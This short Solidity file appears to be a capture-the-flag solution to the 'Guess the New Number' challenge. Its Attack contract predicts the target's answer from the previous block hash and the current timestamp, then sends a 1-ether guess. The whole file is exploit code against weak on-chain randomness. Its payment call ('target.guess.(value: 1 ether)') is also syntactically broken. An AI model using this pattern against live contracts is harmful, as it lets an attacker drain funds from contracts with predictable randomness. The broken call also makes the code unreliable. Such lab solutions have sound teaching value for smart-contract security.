pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract Attack {

    GuessTheNewNumberChallenge target;

    function Attack(address _targetAddress) public {
        target = GuessTheNewNumberChallenge(_targetAddress);
    }

    function _attack() external payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        target.guess.(value: 1 ether)(answer);
        require(target.isComplete());
    }

    function() public payable {}
}